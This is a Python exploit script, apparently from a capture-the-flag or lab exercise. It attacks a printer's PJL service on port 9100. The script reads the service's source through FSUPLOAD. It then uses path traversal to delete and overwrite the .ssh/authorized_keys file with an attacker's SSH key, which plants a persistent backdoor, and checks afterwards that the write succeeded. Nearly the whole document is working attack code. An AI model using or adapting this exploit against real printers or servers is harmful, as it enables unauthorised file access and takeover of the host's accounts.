#!/usr/bin/env python3
import base64
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def rx(s, n=8000):
    b = b""
    try:
        while len(b) < n:
            c = s.recv(65536)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


# --- read jetdirect source (FSUPLOAD = read) ---
s = socket.socket()
s.settimeout(20)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSUPLOAD NAME="jetdirect.py"\r\nOFFSET=0\r\nSIZE=5119\r\n')
jet = rx(s, 6000)
s.close()
print("jet_len", len(jet))
if b"def " in jet:
    print("JET_OK")
    print(base64.b64encode(jet).decode()[:4000])

# --- write key ---
for prep in (b'@PJL FSMKDIR NAME="../.ssh"\r\n', f'@PJL FSDELETE NAME="{PATH}"\r\n'.encode()):
    s = socket.socket()
    s.settimeout(4)
    s.connect(("127.0.0.1", 9100))
    s.sendall(prep)
    rx(s, 200)
    s.close()

writes = [
    f'@PJL FSDOWNLOAD NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY,
    f'@PJL FSDOWNLOAD FORMAT:BINARY NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY,
    f'@PJL FSAPPEND NAME="{PATH}"\r\nSIZE={N}\r\n'.encode() + KEY,
]
for i, w in enumerate(writes):
    s = socket.socket()
    s.settimeout(8)
    s.connect(("127.0.0.1", 9100))
    s.sendall(w)
    print("w", i, repr(rx(s, 256)[:80]))
    s.close()

s = socket.socket()
s.settimeout(5)
s.connect(("127.0.0.1", 9100))
s.sendall(b'@PJL FSQUERY NAME="../.ssh"\r\n')
print("Q", rx(s, 1024))
s.close()